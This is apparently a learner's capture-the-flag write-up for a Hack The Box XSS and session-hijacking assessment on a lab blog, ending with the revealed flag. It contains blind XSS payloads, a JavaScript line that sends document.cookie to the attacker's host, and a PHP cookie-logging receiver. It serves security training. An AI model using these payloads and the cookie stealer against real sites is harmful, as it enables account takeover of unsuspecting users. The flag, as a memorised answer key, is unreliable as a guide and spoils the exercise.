We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the /assessment directory on the server using the browser:

Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag



Question 1 -  What is the value of the 'flag' cookie? 

1) http://10.129.2.24/assessment/
2) on main page we see Note: comments must be approved by an admin, so submitting them may take a few seconds. & if we scroll a bit we see a search text form and a 'welcome to security blog' post -> click this post
3) http://10.129.2.24/assessment/index.php/2021/06/11/welcome-to-security-blog/ 
4) now we have a comment name email and website form to test xss scripts in 
5) open nc listener to see whats vulnerable -> nc -nlvp 4444
6) '><script src="http://10.10.15.252:4444/comment"></script>
'><script src="http://10.10.15.252:4444/name"></script>
'><script src="http://10.10.15.252:4444/email"></script>
'><script src="http://10.10.15.252:4444/website"></script>
7) we notice the webiste field is vulnerable as we caught a request on our listener with GET /website HTTP/1.1
8) write script.js script lol -> new Image().src='http://10.10.15.25.:8080/index.php?c=' + document.cookie;
9) also write an index.php in same directory as script.js ( i just did /home ) -> 

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
10) start a php -S 0.0.0.0:8080 server 
11) go back to the comment page adn start a new comment with this in the website field ->  '><script src=http://10.10.15.252:8080/script.js></script>
12) ENSURE ON script.js its the port we are running our PHP server off of -> in this instance it be 8080
13) output: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1741293731;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
